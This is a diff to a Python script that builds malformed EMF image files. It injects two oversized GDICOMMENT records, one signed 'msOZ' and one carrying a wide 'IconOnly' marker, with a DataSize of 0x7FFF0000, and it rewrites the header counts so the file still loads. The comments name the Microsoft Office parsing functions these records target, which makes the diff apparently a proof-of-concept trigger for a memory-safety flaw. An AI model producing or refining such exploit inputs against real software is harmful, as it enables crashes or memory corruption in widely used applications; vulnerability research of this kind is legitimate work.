@@ -41,6 +41,9 @@ def walk(d):
         off += rl
     return recs, off
 
+def build_comment(datasize, payload):
+    return struct.pack('<III', 0x46, 12 + len(payload), datasize) + payload
+
 def patch(path_in, path_out, stress=0x7FFF0000):
     d = bytearray(open(path_in, 'rb').read())
     recs, end = walk(d)
@@ -48,13 +51,21 @@ def patch(path_in, path_out, stress=0x7FFF0000):
     for (o, rt, rl) in comments:
         dsz = struct.unpack_from('<I', d, o + 8)[0]
         n = min(dsz, rl - 12)
-        # neutralize any marker text inside comment data
         d[o + 12:o + 12 + n] = b'\x00' * n
-    if comments:
-        o = comments[-1][0]
-        struct.pack_into('<I', d, o + 8, stress)
+    # inject two oversized GDICOMMENT records before EOF:
+    #  1) msOZ-signed (mso GELOASCAN::FRead budget path)
+    #  2) wide L"IconOnly" marker (ppcore FIsIconOnlyComment DataSize/2 search path)
+    eof = [r for r in recs if r[1] == 0x0E]
+    if not eof:
+        raise RuntimeError('no EOF record')
+    pos = eof[-1][0]
+    inj = build_comment(stress, (b'msOZMSOFFICE9.0' + b'\x00' * 5).ljust(20, b'\x00'))
+    inj += build_comment(stress, b'I\x00c\x00o\x00n\x00O\x00n\x00l\x00y\x00' + b'\x00' * 4)
+    d[pos:pos] = inj
+    nb, nr = struct.unpack_from('<II', d, 0x30)
+    struct.pack_into('<II', d, 0x30, nb + len(inj), nr + 2)
     open(path_out, 'wb').write(bytes(d))
-    print(f"patched {path_out} comments={len(comments)} lastDataSize={hex(stress)}")
+    print(f"patched {path_out} comments={len(comments)} injected=2 lastDataSize={hex(stress)}")
 
 if __name__ == '__main__':
     if sys.argv[1] == 'good':
